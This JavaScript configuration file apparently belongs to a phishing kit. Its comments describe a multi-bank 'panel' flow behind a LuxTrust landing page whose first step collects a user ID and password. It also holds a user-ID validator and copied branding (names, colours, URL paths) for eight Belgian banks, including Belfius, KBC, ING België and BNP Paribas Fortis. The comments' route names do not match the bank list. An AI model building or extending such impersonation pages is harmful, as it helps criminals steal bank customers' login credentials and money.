// Central config for Luxembourg multi-panel flow.
// Routes: / (LuxTrust landing), /bgl, /ing, /eboo, /rnet
// Step 1 for every bank is always: User ID (4 digits + 4 letters) + Password.

export const USER_ID_REGEX = /^\d{4}[A-Za-z]{4}$/;
export const USER_ID_EXAMPLE = "1234ABCD";

export function validateUserId(v) {
  const clean = (v || "").replace(/[\s-]/g, "");
  if (!clean) return "User ID is required.";
  if (!USER_ID_REGEX.test(clean))
    return `User ID must be 4 digits + 4 letters (e.g. ${USER_ID_EXAMPLE}).`;
  return "";
}

export const BANKS = [
  {
    slug: "argenta",
    short: "ARGENTA",
    name: "ARGENTA",
    sub: "Argenta",
    urlLabel: "/argenta",
    color: "#007a33",
    dark: "#006428",
    soft: "#e6f3eb",
    initial: "A",
  },
  {
    slug: "belfius",
    short: "BELFIUS",
    name: "BELFIUS",
    sub: "Belfius",
    urlLabel: "/belfius",
    color: "#d5003d",
    dark: "#a80030",
    soft: "#fde8ef",
    initial: "B",
  },
  {
    slug: "ing",
    short: "ING",
    name: "ING",
    sub: "ING België",
    urlLabel: "/ing",
    color: "#ff6200",
    dark: "#e55700",
    soft: "#fff1e6",
    initial: "I",
  },
  {
    slug: "crelan",
    short: "CRELAN",
    name: "CRELAN",
    sub: "Crelan",
    urlLabel: "/crelan",
    color: "#009157",
    dark: "#007245",
    soft: "#e6f4ed",
    initial: "C",
  },
  {
    slug: "bnp",
    short: "BNP",
    name: "BNP PARIBAS FORTIS",
    sub: "BNP Paribas Fortis",
    urlLabel: "/bnp",
    color: "#00965e",
    dark: "#007a4b",
    soft: "#e6f4ed",
    initial: "B",
  },
  {
    slug: "fintro",
    short: "FINTRO",
    name: "FINTRO",
    sub: "Fintro",
    urlLabel: "/fintro",
    color: "#003da5",
    dark: "#002f7d",
    soft: "#e8eefb",
    initial: "F",
  },
  {
    slug: "hello",
    short: "HELLO",
    name: "HELLO BANK!",
    sub: "Hello bank!",
    urlLabel: "/hello",
    color: "#009ad5",
    dark: "#0080b1",
    soft: "#e6f5fb",
    initial: "H",
  },
  {
    slug: "kbc",
    short: "KBC",
    name: "KBC",
    sub: "KBC Bank",
    urlLabel: "/kbc",
    color: "#0092db",
    dark: "#0077b3",
    soft: "#e6f4fb",
    initial: "K",
  },
];

export function getBank(slug) {
  return BANKS.find((b) => b.slug === (slug || "").toLowerCase());
}
